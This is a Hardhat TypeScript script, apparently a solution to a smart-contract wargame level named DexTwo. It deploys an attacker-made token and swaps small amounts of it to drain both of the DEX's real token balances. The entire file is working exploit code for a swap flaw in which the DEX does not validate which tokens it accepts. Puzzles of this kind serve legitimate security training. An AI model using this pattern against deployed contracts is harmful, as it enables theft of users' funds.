import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x8715BFDa28738742A1749fFBeaE33514e3b142Fb";
const CONTRACT_NAME = "DexTwo";

async function main() {
  const [attacker] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const token1 = await contract.token1();
  const token2 = await contract.token2();

  let tx;
  tx = await contract.approve(contract.address, 100000);
  await tx.wait();

  const attackerTokenFactory = await ethers.getContractFactory("SwappableTokenTwo");
  const attackerToken = await attackerTokenFactory.deploy(contract.address, "Attack on Token", "AOT", 100000);
  await attackerToken.deployed();

  tx = await attackerToken["approve(address,address,uint256)"](attacker.address, contract.address, 100000);
  await tx.wait();

  tx = await attackerToken.transfer(contract.address, 1);
  await tx.wait();

  tx = await contract.swap(attackerToken.address, token1, 1);
  await tx.wait();

  tx = await attackerToken.transfer(contract.address, 8);
  await tx.wait();

  tx = await contract.swap(attackerToken.address, token2, 10);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
